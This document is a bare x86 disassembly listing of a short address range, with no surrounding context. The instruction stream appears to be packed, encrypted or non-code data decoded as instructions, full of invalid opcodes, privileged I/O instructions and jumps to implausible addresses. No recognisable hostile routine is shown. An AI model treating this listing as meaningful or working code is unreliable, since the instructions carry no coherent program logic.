  40901e:	xchg   edx,eax
  40901f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409020:	mov    ch,0xe0
  409022:	mov    ah,BYTE PTR [edi+edi*8-0x190ff701]
  409029:	cwde   
  40902a:	xchg   esp,eax
  40902b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40902c:	inc    DWORD PTR [ebx-0x8b870]
  409032:	push   edx
  409033:	pop    edi
  409034:	je     0x409051
  409036:	test   cl,0xcf
  409039:	mul    DWORD PTR [edx-0x5c]
  40903c:	add    al,0x75
	...
  409066:	add    BYTE PTR [edi+0x71],dh
  409069:	test   eax,ebx
  40906b:	mov    ah,BYTE PTR [edi+edi*8+0x75a545ff]
  409072:	or     BYTE PTR [ebp-0x6d00500d],cl
  409078:	nop
  409079:	or     ch,BYTE PTR [edx+0x1c]
  40907c:	add    cl,BYTE PTR [esi+0x75]
  40907f:	adc    al,0xda
  409081:	sti    
  409082:	mov    al,0x1b
  409084:	fisttp QWORD PTR [esi-0x4b]
  409087:	clc    
  409088:	ins    BYTE PTR es:[edi],dx
  409089:	dec    edi
  40908a:	push   esp
  40908c:	cmp    eax,0x8503ff98
  409091:	cdq    
  409092:	in     al,dx
  409093:	repz jl 0x4090e5
  409096:	call   0xff8f5ef8
  40909b:	jmp    0x409073
  40909d:	pop    ebx
  40909e:	mul    ebx
  4090a0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4090a1:	pop    esp
  4090a2:	ss nop
  4090a4:	pushf  
  4090a5:	dec    edi
  4090a6:	dec    DWORD PTR [ecx-0x3400a85f]
  4090ac:	cdq    
  4090ad:	sbb    esi,DWORD PTR [ebx+eax*8-0x2b4ab0bc]
  4090b4:	push   esp
  4090b5:	dec    edi
  4090b6:	inc    esp
  4090b8:	and    DWORD PTR [edi-0x66b35401],edx
  4090be:	lock stos DWORD PTR es:[edi],eax
  4090c0:	fs dec edi
  4090c2:	call   0xff8fc6f8
  4090c7:	xchg   ebx,eax
  4090c8:	mov    esi,0xe94a
	...
  4090f1:	add    BYTE PTR [eax],al
  4090f3:	add    BYTE PTR [ecx-0x12],dh
  4090f6:	dec    ebp
  4090f7:	inc    DWORD PTR [ebx+0x2de84f6e]
  4090fd:	loop   0x409101
  4090ff:	add    BYTE PTR [ebp-0x41],ah
  409102:	cli    
  409103:	call   eax
  409105:	js     0x409166
  409107:	sbb    DWORD PTR [eax+0x25],0xffffffd9
  40910b:	inc    ebp
  40910d:	out    dx,al
  40910e:	dec    ebp
  40910f:	jne    0x409135
  409111:	or     ah,BYTE PTR [esi]
  409113:	mov    cl,0x4b
  409115:	lods   al,BYTE PTR ds:[esi]
  409116:	jnp    0x40915d
  409118:	inc    eax
  409119:	cdq    
  40911a:	and    bl,BYTE PTR [eax-0x23]
  40911d:	pop    edx
  40911e:	jmp    0x91a33a71
  409123:	shr    BYTE PTR [eax],1
  409125:	repz xchg ebp,eax
  409127:	dec    esi
  409128:	test   eax,0x23d88df6
  40912d:	add    ebx,DWORD PTR [ebx]
  40912f:	xchg   ebp,eax
  409130:	adc    esi,ebx
  409132:	scas   eax,DWORD PTR es:[edi]
  409133:	inc    ecx
  409134:	and    BYTE PTR [ebx+0x1c],bl
  409137:	jnp    0x409129
  409139:	fsub   QWORD PTR [edi+edi*1-0x7f9a0d0d]
  409140:	pop    ecx
  409141:	out    dx,eax
  409142:	mov    eax,0x565f714e
  409147:	sbb    ch,bh
  409149:	mov    ds:0xfac403a8,eax
  40914e:	add    ebx,DWORD PTR gs:[esi+eiz*2]
  409152:	sub    esi,edi
  409154:	mov    al,ds:0x3eb92
	...
  409181:	sbb    al,0x1a
  409183:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409184:	dec    ebx
  409185:	sbb    al,0x5b
  409187:	jmp    0x15d96c8f
  40918c:	dec    esi
  40918d:	and    ebx,DWORD PTR [ebx-0x17]
  409190:	fldenv [ebx-0x6426167c]
  409196:	test   cl,ch
  409198:	sbb    cl,0xe6
  40919b:	cwde   
  40919c:	and    BYTE PTR [ecx-0x7cb20219],0x8b
  4091a3:	out    dx,al
  4091a4:	xlat   BYTE PTR ds:[ebx]
  4091a5:	jae    0x409199
  4091a7:	pop    ebx
  4091a8:	push   eax
  4091a9:	test   BYTE PTR [ebp+edi*2-0x5699e3fc],dh
  4091b0:	fcomp  DWORD PTR [eax]
  4091b2:	add    al,0xb
  4091b4:	add    bl,BYTE PTR [ebx+ebx*2]
  4091b7:	push   ecx
  4091b8:	(bad)  
  4091b9:	in     al,0x9b
  4091bb:	jmp    0x9f630c
  4091c0:	rol    DWORD PTR [esi-0x57],0xfe
  4091c4:	scas   al,BYTE PTR es:[edi]
  4091c5:	mov    ch,0xa
  4091c7:	lea    ebp,[esp+edx*8-0x17]
  4091cb:	(bad)  
  4091cc:	sahf   
  4091cd:	jo     0x40915b
  4091cf:	call   0xff331afa
  4091d4:	pusha  
  4091d5:	mov    ds:0x6186f6ea,eax
  4091da:	loopne 0x409160
  4091dc:	lods   eax,DWORD PTR ds:[esi]
  4091dd:	jno    0x4091d1
  4091df:	(bad)  
  4091e0:	sbb    eax,esp
  4091e2:	adc    ebx,DWORD PTR [eax+0x28]
	...
  40920d:	add    BYTE PTR [eax],ah
  40920f:	repnz mov ah,0x59
  409212:	dec    ecx
  409213:	repnz (bad) 
  409215:	pop    esi
  409216:	adc    edi,esp
  409218:	inc    edi
  409219:	test   al,0x1f
  40921b:	add    edx,DWORD PTR [ecx-0x69]
  40921e:	imul   esi,edx,0xea446c88
  409224:	(bad)  
  409225:	ds out 0xf1,al
  409228:	cmp    WORD PTR [eax-0x66],si
  40922c:	add    BYTE PTR [esi],ch
  40922e:	xchg   ebx,eax
  40922f:	jmp    0x834:0xf26126f6
  409236:	push   0xd01009a
  40923b:	test   eax,0xd8170efe
  409240:	jmp    0x409240
  409242:	loopne 0x409235
  409244:	imul   ebp,ecx,0xa857e667
  40924a:	pop    ds
  40924b:	repnz mov ah,0xf9
  40924e:	shl    cl,1
  409250:	(bad)  
  409251:	out    0xa,al
  409253:	cld    
  409254:	inc    edi
  409255:	sub    BYTE PTR [eax],ah
  409257:	add    edx,DWORD PTR ds:0x88f1d09f
  40925d:	fs imul ecx
  409260:	inc    BYTE PTR [eax]
  409262:	pop    edx
  409263:	adc    edi,edi
  409265:	addr16 xor eax,0x8a003fc4
  40926b:	enter  0xf7ef,0x8a
  40926f:	sahf   
  409270:	push   DWORD PTR ds:0x0
	...
  40929a:	add    BYTE PTR [ebp+esi*4-0x7972ffc1],ah
  4092a1:	mov    ch,0xff
  4092a3:	mov    dh,BYTE PTR [ebp+eax*4-0x20]
  4092a7:	mov    dl,0x9f
  4092a9:	dec    DWORD PTR [ebp-0x8bb80]
  4092af:	mov    ch,BYTE PTR [esi+eiz*2-0xe3d205]
  4092b6:	(bad)  
  4092b7:	xor    BYTE PTR [edi+esi*8+0x359f7aff],cl
  4092be:	loope  0x40926d
  4092c0:	sbb    eax,0xc921e7ff
  4092c5:	(bad)  
  4092c6:	(bad)  
  4092c7:	mov    esi,0x4613749c
  4092cc:	loope  0x4092a5
  4092ce:	test   DWORD PTR [edx],0xbf75049f
  4092d4:	lahf   
  4092d5:	xor    BYTE PTR [edi-0x8bfc0],cl
  4092db:	cli    
  4092dc:	xchg   edx,eax
  4092dd:	or     al,bh
  4092df:	inc    eax
  4092e0:	inc    eax
  4092e1:	idiv   edi
  4092e3:	or     ch,cl
  4092e5:	(bad)  
  4092e6:	inc    DWORD PTR [ebp+0x5795e6ac]
  4092ec:	lahf   
  4092ed:	dec    DWORD PTR [ebp-0x8d400]
  4092f3:	mov    ch,BYTE PTR [ebp+0x1d8de366]
  4092f9:	(bad)  
  4092fa:	(bad)  
  4092fb:	nop
  4092fc:	xchg   edi,esi
  4092fe:	inc    DWORD PTR [eax]
	...
  409328:	dec    edx
  409329:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40932a:	xor    eax,0xc53a1ce1
  40932f:	inc    DWORD PTR [ebx+0x72]
  409332:	xchg   ecx,eax
  409333:	call   DWORD PTR [ebx-0x13]
  409336:	inc    edx
  409337:	je     0x409368
  409339:	test   DWORD PTR [ecx+0x4aa94bd0],ecx
  40933f:	add    al,0xb1
  409341:	sti    
  409342:	dec    ecx
  409343:	xor    BYTE PTR [ebx+0x2bf7307f],ah
  409349:	rcr    DWORD PTR [esi+0xa],1
  40934c:	pop    ebx
  40934d:	jg     0x40937f
  40934f:	neg    DWORD PTR [ebx]
  409351:	loope  0x409356
  409353:	add    BYTE PTR [edx+eax*1],bl
  409356:	mov    bl,0xe7
  409358:	ins    DWORD PTR es:[edi],dx
  409359:	xor    al,0x4b
  40935b:	call   FWORD PTR [edi-0x4089fda]
  409361:	add    BYTE PTR [esp+esi*2],0x33
  409365:	test   DWORD PTR [ecx+0x4b90f3d4],ecx
  40936b:	add    ch,BYTE PTR [ecx+0x50]
  40936e:	fdivp  st(7),st
  409370:	test   al,0x76
  409372:	cmp    bh,dh
  409374:	rcr    DWORD PTR [eax-0x6a6e014c],cl
  40937a:	push   ebx
  40937b:	inc    ebx
  40937d:	cdq    
  40937e:	pushf  
  40937f:	fstp   TBYTE PTR [ebx+0x28bfff40]
  409385:	jmp    0x40930c
  409387:	mov    ebp,0xff4b48d8
	...
  4093b4:	add    BYTE PTR [edi+ecx*8],bl
  4093b7:	out    dx,eax
  4093b8:	(bad)  
  4093b9:	rcl    DWORD PTR [ebp+0x53],1
  4093bc:	call   DWORD PTR [ebx-0x744e08b7]
  4093c2:	lock inc ecx
  4093c4:	test   DWORD PTR [eax-0x10],edi
  4093c7:	dec    ecx
  4093c8:	call   FWORD PTR [edx+eax*1]
  4093cb:	add    eax,DWORD PTR [eax]
  4093cd:	lahf   
  4093ce:	pop    edx
  4093cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4093d0:	pop    edi
  4093d1:	jae    0x4093c2
  4093d3:	fld    QWORD PTR [ebx]
  4093d5:	call   0x48c8fe5d
  4093da:	out    0xcd,eax
  4093dc:	dec    edx
  4093dd:	sbb    al,0x67
  4093df:	dec    ebx
  4093e0:	xchg   DWORD PTR [ecx+0x434ab602],ecx
  4093e6:	pop    edx
  4093e7:	cmp    eax,0xe95cc3ad
  4093ec:	pop    edx
  4093ed:	jb     0x4093de
  4093ef:	sbb    edi,esp
  4093f1:	inc    ebx
  4093f2:	int3   
  4093f3:	dec    esi
  4093f4:	dec    edx
  4093f5:	and    ebp,edi
  4093f7:	pop    ebx
  4093f8:	push   edi
  4093f9:	adc    ebp,edi
  4093fb:	lea    ecx,[edx-0x77]
  4093fe:	arpl   WORD PTR [ecx+0x7deeba61],dx
  409404:	dec    edx
  409405:	leave  
  409406:	add    edi,DWORD PTR [esi+0x4a]
  409409:	sti    
  40940a:	out    dx,al
  40940b:	repz sti 
  40940d:	sti    
  40940e:	adc    edx,DWORD PTR [edi-0x6c1114b6]
  409414:	aaa    
  409415:	jmp    0x409405
  409417:	push   ebp
  409418:	dec    edx
	...
  409441:	add    BYTE PTR [ecx-0x2cb5aa09],dl
  409447:	out    dx,al
  409448:	mov    ebx,0x8ed3c3fb
  40944d:	dec    edx
  40944e:	ret    
  40944f:	out    dx,al
  409450:	jnp    0x409479
  409452:	mov    bl,0xee
  409454:	sub    eax,0x1163294a
  409459:	scas   eax,DWORD PTR es:[edi]
  40945a:	jns    0x40944a
  40945c:	sbb    eax,0x1dfb694a
  409461:	dec    edx
  409462:	fwait
  409463:	out    dx,al
  409464:	xchg   ebx,eax
  409465:	sti    
  409466:	jnp    0x40942b
  409468:	push   esi
  409469:	dec    edx
  40946a:	mov    ebp,esi
  40946c:	xor    ebx,DWORD PTR [edi-0x75]
  40946f:	out    dx,al
  409470:	push   ebp
  409472:	(bad)  
  409473:	loopne 0x409425
  409475:	out    dx,al
  409476:	in     eax,0xed
  409478:	mov    ah,0xd5
  40947a:	int    0xed
  40947c:	(bad)  
  40947d:	rcl    DWORD PTR [ebp-0x55],1
  409480:	(bad)  
  409481:	(bad)  
  409482:	in     eax,0xa7
  409484:	out    0xd6,eax
  409486:	in     eax,0xed
  409488:	out    0x3d,eax
  40948a:	scas   eax,DWORD PTR es:[edi]
  40948b:	out    dx,al
  40948c:	(bad)  
  40948d:	mov    esi,0xb6f6fb93
  409492:	in     eax,0x2
  409494:	imul   edi,DWORD PTR [eax-0x1b],0xd05cfeed
  40949b:	in     eax,0xfe
  40949d:	sahf   
  40949e:	ror    BYTE PTR [ecx+esi*4+0x44ee6596],0x91
	...
  4094ce:	add    BYTE PTR [edi-0x55],dh
  4094d1:	cld    
  4094d2:	xchg   BYTE PTR [ebp-0x12],dl
  4094d5:	je     0x409554
  4094d7:	pusha  
  4094d8:	jno    0x409477
  4094da:	jmp    0xe202b8fe
  4094df:	pop    ds
  4094e0:	mov    BYTE PTR [ebx-0xbe95eab],cl
  4094e6:	rcr    DWORD PTR [edi],cl
  4094e8:	or     DWORD PTR [esi],0xe855eb56
  4094ee:	fnstenv [ebp-0x748f0113]
  4094f4:	icebp  
  4094f5:	addr16 jmp 0xc1fe931a
  4094fb:	add    DWORD PTR [ebp-0x7d2816bf],0x58
  409502:	test   al,0x1f
  409504:	out    dx,al
  409505:	je     0x4094f8
  409507:	inc    edi
  409508:	xchg   edx,eax
  409509:	ficom  DWORD PTR [esi]
  40950b:	in     eax,0xdf
  40950d:	inc    esp
  40950e:	adc    eax,ecx
  409510:	jne    0x4094c5
  409512:	add    BYTE PTR [ebp+0xa67ff18],bh
  409518:	ret    0x3f
  40951b:	jb     0x409579
  40951d:	loope  0x409567
  40951f:	les    ebx,FWORD PTR [ecx-0x18]
  409522:	sbb    eax,0xbffa289
  409527:	mov    ch,0x1d
  409529:	and    eax,0x688b0889
  40952e:	add    DWORD PTR [ebp-0x6e],eax
  409531:	mov    esi,0xff
	...
  40955a:	add    BYTE PTR [eax],al
  40955c:	or     bh,ch
  40955e:	out    0xa2,al
  409560:	nop
  409561:	mov    ds:0x9ef8ffff,al
  409566:	push   DWORD PTR [ebp+0x69]
  409569:	mov    ds:0x2f8d0875,al
  40956e:	lods   eax,DWORD PTR ds:[esi]
  40956f:	inc    DWORD PTR [edx-0x620b8a5e]
  409575:	aas    
  409576:	mov    al,0xff
  409578:	mov    ds:0x3458ba10,al
  40957d:	push   edi
  40957e:	push   DWORD PTR [ebp+0xd]
  409581:	xchg   ecx,eax
  409582:	(bad)  
  409583:	cld    
  409584:	jb     0x409529
  409586:	push   DWORD PTR [ebp-0x7f]
  409589:	mov    ds:0x194d0875,eax
  40958e:	lods   eax,DWORD PTR ds:[esi]
  40958f:	inc    DWORD PTR [edx+0x31]
  409592:	ret    0xc504
  409595:	mov    ebp,0x2c46ec89
  40959a:	cld    
  40959b:	push   0xffffffb5
  40959d:	push   cs
  40959e:	push   cs
  40959f:	dec    DWORD PTR [eax-0x5f1a1910]
  4095a5:	mov    ds:0x947889ff,eax
  4095aa:	push   0xbe93b500
  4095af:	push   0x3fc1b1
  4095b4:	sbb    al,0xda
  4095b6:	jmp    0x1475:0x4801dd58
  4095bd:	dec    edx
  4095be:	xor    ebx,ecx
	...
  4095e8:	add    BYTE PTR [ebx+0x787546ed],al
  4095ee:	in     eax,0xcc
  4095f0:	pop    es
  4095f1:	test   ah,dh
  4095f3:	cwde   
  4095f4:	jmp    FWORD PTR [ebx-0x55]
  4095f7:	inc    ecx
  4095f8:	add    al,0x1c
  4095fa:	daa    
  4095fb:	jnp    0x4095e9
  4095fd:	lahf   
  4095fe:	mov    esi,0x981c6a47
  409603:	hlt    
  409604:	(bad)  
  409605:	shr    ecx,1
  409607:	pop    edx
  409608:	stos   BYTE PTR es:[edi],al
  409609:	jno    0x4095b8
  40960b:	inc    esi
  40960c:	mov    ecx,esp
  40960e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40960f:	(bad)  
  409611:	xor    ebp,DWORD PTR [ebp-0x6501977b]
  409617:	(bad)  
  40961a:	adc    al,0xac
  40961c:	inc    eax
  40961d:	sbb    al,0xc5
  40961f:	rol    BYTE PTR [edi],1
  409621:	add    al,0x67
  409623:	sub    eax,0x4480bff
  409628:	push   0xffc53b78
  40962d:	cmp    DWORD PTR [eax],0xffffffad
  409630:	inc    eax
  409631:	sbb    al,0x7d
  409633:	adc    ecx,esp
  409635:	push   esp
  409636:	ret    
  409637:	add    ch,al
  409639:	inc    ebp
  40963a:	rol    DWORD PTR [esi-0x1],1
  40963d:	daa    
  40963e:	inc    edx
  40963f:	shl    BYTE PTR [ebx],1
  409641:	inc    esp
  409642:	ret    0x40ab
  409645:	sbb    al,0xd2
  409647:	pop    edx
  409648:	and    eax,0x50472c88
	...
  409675:	add    BYTE PTR [edx+eax*1+0x3],al
  409679:	out    dx,eax
  40967a:	jb     0x409695
  40967c:	and    DWORD PTR [ecx+0x5d],ebx
  40967f:	pop    ebx
  409680:	jmp    0xf1a63938
  409685:	pop    ebx
  409686:	sub    al,0x12
  409688:	push   ss
  409689:	inc    edi
  40968a:	test   BYTE PTR [ecx+0x59],dl
  40968d:	inc    edi
  40968e:	mov    ebp,ebx
  409690:	jnp    0x4096d9
  409692:	and    DWORD PTR [ebp-0xf],0x5b
  409696:	test   al,0xbd
  409698:	cmc    
  409699:	inc    esi
  40969a:	gs sbb ch,ah
  40969d:	add    edx,ecx
  40969f:	(bad)  
  4096a1:	sbb    BYTE PTR [eax-0x12],0x36
  4096a5:	scas   eax,DWORD PTR es:[edi]
  4096a6:	lds    ebx,FWORD PTR [edx+0x43]
  4096a9:	cmc    
  4096aa:	push   edx
  4096ab:	gs loope 0x409709
  4096ae:	cli    
  4096af:	mov    ebp,0x959546c5
  4096b4:	mov    ebp,0x2175f17a
  4096b9:	lds    esi,FWORD PTR [ebx]
  4096bb:	loopne 0x4096a8
  4096bd:	fsubr  st(3),st
  4096bf:	cdq    
  4096c0:	jmp    0x159b7a48
  4096c5:	mov    ebx,0xc5306b83
  4096ca:	adc    edx,DWORD PTR [edx+0x5ba7ba81]
  4096d0:	jmp    0xc4b05acf
  4096d5:	lods   eax,DWORD PTR ds:[esi]
  4096d6:	add    ecx,ebx
  4096d8:	das    
  4096d9:	inc    esi
	...
  409702:	add    bl,dh
  409704:	jae    0x4096f6
  409706:	lods   al,BYTE PTR ds:[esi]
  409707:	pop    esp
  409708:	pop    ebx
  409709:	mov    ecx,0x5daea95b
  40970e:	inc    esi
  40970f:	ins    BYTE PTR es:[edi],dx
  409710:	jae    0x4096fb
  409712:	add    eax,ebx
  409714:	test   eax,0x535146b8
  409719:	push   ecx
  40971a:	inc    ebx
  40971b:	jmp    0x8a9bd50a
  409720:	mov    edx,0xf65a35ff
  409725:	add    BYTE PTR [edi-0x63ffd661],ah
  40972b:	push   ebp
  40972c:	mov    eax,ds:0xa3dfdafc
  409731:	(bad)  
  409732:	push   ss
  409733:	fucompp 
  409735:	icebp  
  409736:	aas    
  409737:	pop    ss
  409738:	bound  esi,QWORD PTR [ebp+0x3c]
  40973b:	fisubr DWORD PTR [edi-0x4]
  40973e:	(bad)  
  40973f:	imul   esp,DWORD PTR [edx-0x18],0xffffffe3
  409743:	xchg   esp,eax
  409744:	jmp    0xedc2:0x13c18efe
  40974b:	pop    ds
  40974c:	nop
  40974d:	mov    ecx,ebp
  40974f:	popf   
  409750:	pop    ds
  409751:	cld    
  409752:	inc    ebx
  409753:	sbb    BYTE PTR [ebp+0x12],dh
  409756:	into   
  409757:	pop    ebx
  409758:	(bad)  
  409759:	call   0xff2b3bf3
  40975e:	jo     0x4097db
  409760:	out    0x67,al
  409762:	jmp    0x41fe9186
	...
  40978f:	add    BYTE PTR [ebx+0x47e94183],dh
  409795:	ficomp WORD PTR [eax+0x28]
  409798:	and    dl,ch
  40979a:	je     0x40977d
  40979c:	ja     0x409770
  40979e:	xlat   BYTE PTR ds:[ebx]
  40979f:	mov    fs,WORD PTR [ecx-0x16]
  4097a2:	je     0x409729
  4097a4:	pop    ecx
  4097a5:	jo     0x4097af
  4097a7:	xchg   ecx,eax
  4097a8:	xor    esi,DWORD PTR [edi+0x1d3776fe]
  4097ae:	add    al,0xe9
  4097b0:	mov    edx,0x5c68ebd4
  4097b5:	pop    es
  4097b6:	neg    DWORD PTR [esi+0x61]
  4097b9:	fadd   DWORD PTR [ebp+edx*2-0x78]
  4097bd:	call   0x30a17536
  4097c2:	loope  0x4097c4
  4097c4:	lea    ebx,[edi+edi*8]
  4097c7:	out    0xe7,eax
  4097c9:	jb     0x4097cb
  4097cb:	add    BYTE PTR [esi-0x6b7af063],bh
  4097d1:	pop    ebp
  4097d2:	add    BYTE PTR [eax],al
  4097d4:	repnz test eax,0x5d8500f6
  4097da:	add    bh,al
  4097dc:	rcr    BYTE PTR [ecx+0x5d7507ff],0x6a
  4097e3:	add    BYTE PTR [edi-0x70ff95a3],ch
  4097e9:	pop    ebp
  4097ea:	lea    eax,[ebp+0x71]
  4097ed:	lods   eax,DWORD PTR ds:[esi]
  4097ee:	mov    eax,DWORD PTR [ebp-0x698f]
	...
  40981c:	add    BYTE PTR ds:0x7af875a0,ah
  409822:	sbb    bl,bh
  409824:	call   0x410c5a
  409829:	ds popf 
  40982b:	je     0x409832
  40982d:	ins    BYTE PTR es:[edi],dx
  40982e:	or     DWORD PTR [eax],eax
  409830:	add    BYTE PTR [ebp+0x5],al
  409833:	mov    esp,0xff5f0448
  409838:	jne    0x409883
  40983a:	test   DWORD PTR [ebp+0x509e7ab2],eax
  409840:	mov    edx,ebp
  409842:	jno    0x4097c9
  409844:	hlt    
  409845:	mov    dl,0x9f
  409847:	call   DWORD PTR [eax+0x47]
  40984a:	xchg   DWORD PTR [ebp-0x4e],esi
  40984d:	call   0xff97:0x7585899f
  409854:	call   FWORD PTR [ebp+0x7affae23]
  40985a:	add    bh,bh
  40985c:	addr16 (bad) 
  40985e:	mov    ch,0x3f
  409860:	add    BYTE PTR [edx-0x27],bh
  409863:	out    dx,eax
  409864:	neg    DWORD PTR [ecx+edx*4]
  409867:	inc    esp
  409868:	call   DWORD PTR [ecx]
  40986a:	xchg   ebx,eax
  40986b:	mov    ebx,0x388a1c40
  409870:	mov    cl,0xbb
  409872:	sub    DWORD PTR [edx-0x7b],edi
  409875:	mov    eax,0x36ff4429
  40987a:	repnz ficomp DWORD PTR [ecx-0xfd4cbb]
	...
  4098a9:	add    cl,dl
  4098ab:	inc    edx
  4098ac:	dec    esp
  4098ad:	call   DWORD PTR [ebx-0x2b1ef1af]
  4098b3:	mov    dl,0x2
  4098b5:	call   0xff84bc6b
  4098ba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4098bb:	jg     0x409914
  4098bd:	div    DWORD PTR [ebx-0xf]
  4098c0:	xlat   BYTE PTR ds:[ebx]
  4098c1:	inc    DWORD PTR [ebx]
  4098c3:	xchg   ebx,eax
  4098c4:	stos   BYTE PTR es:[edi],al
  4098c5:	inc    eax
  4098c6:	sbb    al,0x1
  4098c8:	jns    0x4098ba
  4098ca:	push   ebx
  4098cb:	or     DWORD PTR [ebx-0x1],eax
  4098ce:	or     DWORD PTR [ebx],edx
  4098d0:	int3   
  4098d1:	inc    eax
  4098d2:	sbb    al,0x1a
  4098d4:	xchg   ebx,eax
  4098d5:	mov    cl,0x43
  4098d7:	and    DWORD PTR [ebp+0x42b14485],ecx
  4098dd:	jmp    DWORD PTR [ecx+0x2bf76077]
  4098e3:	mov    ecx,0x9b6f67d3
  4098e8:	(bad)  
  4098eb:	(bad)  
  4098ec:	xor    al,0xf7
  4098ee:	adc    edx,ecx
  4098f0:	inc    edx
  4098f1:	xor    eax,0xffc539fd
  4098f6:	sti    
  4098f7:	dec    ebp
  4098f8:	jne    0x4098f9
  4098fa:	sti    
  4098fb:	in     al,dx
  4098fc:	inc    edx
  4098fd:	je     0x409914
  4098ff:	jne    0x409882
  409901:	fdivr  st(3),st
  409903:	js     0x409948
  409905:	add    al,0x69
  409907:	pop    ebx
  409908:	stc    
  409909:	inc    edx
  40990a:	or     al,0xd8
  40990c:	arpl   WORD PTR [eax+eax*1],sp
	...
  409937:	retf   
  409938:	out    0x55,eax
  40993a:	aam    0xc3
  40993c:	and    DWORD PTR [edi+0x43],edi
  40993f:	ret    
  409940:	repz fmul QWORD PTR [esi]
  409943:	fsubr  QWORD PTR [esi-0x19]
  409946:	sar    DWORD PTR [ebx-0x54bc78cb],cl
  40994c:	pop    ds
  40994d:	fs and al,0xab
  409950:	out    0x25,eax
  409952:	sbb    DWORD PTR [ebx+ebx*2],ebx
  409955:	jmp    0x1e3f6ae0
  40995a:	inc    ebx
  40995b:	mov    ebx,DWORD PTR [edx-0x6b]
  40995e:	ficomp DWORD PTR [esi+0x7b3b14a5]
  409964:	out    0xe8,eax
  409966:	mov    bh,0xe1
  409968:	(bad)  [ebx]
  40996a:	sub    al,0x73
  40996c:	out    0xed,eax
  40996e:	add    ebp,eax
  409970:	popf   
  409971:	push   ecx
  409972:	add    al,0x1c
  409974:	clc    
  409975:	sahf   
  409976:	inc    edx
  409977:	leave  
  409978:	push   edx
  409979:	shr    DWORD PTR [edi+0x76],0xe7
  40997d:	int    0x42
  40997f:	mov    esi,esi
  409981:	mov    ebp,0x33e73b42
  409986:	or     al,0x44
  409988:	pop    edx
  409989:	add    BYTE PTR [edx+0x2b],0xe7
  40998d:	jae    0x4099ba
  40998f:	sub    esp,edi
  409991:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409992:	inc    edx
  409993:	xchg   ecx,eax
  409994:	push   ebx
  409995:	xchg   ecx,eax
  409996:	xor    eax,0x4295e6c6
	...
  4099c3:	add    cl,dl
  4099c5:	call   DWORD PTR [ebp-0x418fcbe]
  4099cb:	or     eax,DWORD PTR [eax+eax*1]
  4099ce:	push   ebx
  4099cf:	inc    edx
  4099d0:	repz out 0xff,al
  4099d3:	cmp    edi,DWORD PTR [edi]
  4099d5:	out    dx,al
  4099d6:	(bad)  
  4099d7:	outs   dx,BYTE PTR ds:[esi]
  4099d8:	pop    esi
  4099d9:	jo     0x4099e3
  4099db:	push   ecx
  4099dc:	xchg   ebx,eax
  4099dd:	mov    ah,0xfe
  4099df:	pop    esi
  4099e0:	pop    esi
  4099e1:	mov    al,0xe3
  4099e3:	pop    esi
  4099e4:	pop    esi
  4099e5:	out    0xe7,al
  4099e7:	xchg   ecx,eax
  4099e8:	dec    esp
  4099e9:	out    0xfe,al
  4099eb:	inc    esi
  4099ec:	xor    al,0xf7
  4099ee:	idiv   BYTE PTR [esi]
  4099f0:	pop    esi
  4099f1:	rep lods al,BYTE PTR ds:[esi]
  4099f3:	test   BYTE PTR [esi-0x1a],bl
  4099f6:	(bad)  
  4099f7:	je     0x4099f0
  4099f9:	in     eax,dx
  4099fa:	(bad)  
  4099fb:	es inc edi
  4099fd:	mov    ecx,0xe5de1eac
  409a02:	mov    ah,0x19
  409a04:	inc    esi
  409a05:	out    0xfe,al
  409a07:	add    DWORD PTR [esi-0x21f90148],esp
  409a0d:	lahf   
  409a0e:	clc    
  409a0f:	adc    BYTE PTR [ebp-0x22090118],ch
  409a15:	outs   dx,DWORD PTR ds:[esi]
  409a16:	cld    
  409a17:	add    edx,ebp
  409a19:	ret    
  409a1a:	(bad)  
  409a1b:	call   0xe948b306
  409a20:	push   0xffffffd1
  409a22:	jmp    0x409a8e
  409a24:	aam    0xe6
  409a26:	imul   ebp,ecx,0x0
	...
  409a50:	add    BYTE PTR [ecx+0x49],dh
  409a53:	(bad)  
  409a54:	cmp    al,0x28
  409a56:	repz test al,0x93
  409a59:	fucom  st(5)
  409a5b:	mov    BYTE PTR [esp+ebx*8],ch
  409a5e:	jb     0x409a1b
  409a60:	adc    BYTE PTR [edi-0x1a],bl
  409a63:	std    
  409a64:	sbb    al,0x28
  409a66:	repz adc eax,0xfee65d9f
  409a6c:	sbb    al,0x5c
  409a6e:	out    0x74,al
  409a70:	loope  0x409aa9
  409a72:	rsm    
  409a74:	add    BYTE PTR [edx-0x63d3665],ah
  409a7a:	pop    ecx
  409a7b:	push   ebp
  409a7c:	mov    esp,DWORD PTR [ecx+0x1ffcc3df]
  409a82:	pop    edi
  409a83:	push   0x14
  409a85:	inc    edx
  409a86:	scas   al,BYTE PTR es:[edi]
  409a87:	push   es
  409a88:	call   0x40124a
  409a8d:	cmp    al,0x1e
  409a8f:	sti    
  409a90:	push   0xbeef59b5
  409a95:	int    0x3c
  409a97:	pop    ecx
  409a98:	inc    ecx
  409a99:	lds    esi,FWORD PTR [ecx+0x597459d9]
  409a9f:	push   DWORD PTR [ebp-0x43]
  409aa2:	xor    DWORD PTR [ebx-0x2a],esp
  409aa5:	inc    edx
  409aa6:	pushf  
  409aa7:	push   DWORD PTR [ebp+0x31]
  409aaa:	pushf  
  409aab:	jne    0x409ab5
  409aad:	sbb    eax,0x12ffa9c2
  409ab2:	xchg   edx,eax
  409ab3:	ret    0x4
	...
  409ade:	test   DWORD PTR [edx+ecx*4],ecx
  409ae1:	in     al,dx
  409ae2:	add    al,0x93
  409ae4:	fdiv   st,st(7)
  409ae6:	jb     0x409a82
  409ae8:	lea    eax,[ebp+0x71]
  409aeb:	or     esi,edi
  409aed:	jne    0x409b40
  409aef:	call   0xe7ff:0x1a0de135
  409af6:	and    eax,edx
  409af8:	(bad)  
  409af9:	(bad)  
  409afa:	ds cdq 
  409afc:	jne    0x40f372
  409b02:	jp     0x409b20
  409b04:	test   DWORD PTR [eax],0xc7005935
  409b0a:	clc    
  409b0b:	and    bh,bh
  409b0d:	pop    es
  409b0e:	add    eax,0x2f006a59
  409b13:	pop    edi
  409b14:	push   0x0
  409b16:	sbb    al,0x58
  409b18:	add    al,0x8d
  409b1a:	pop    ecx
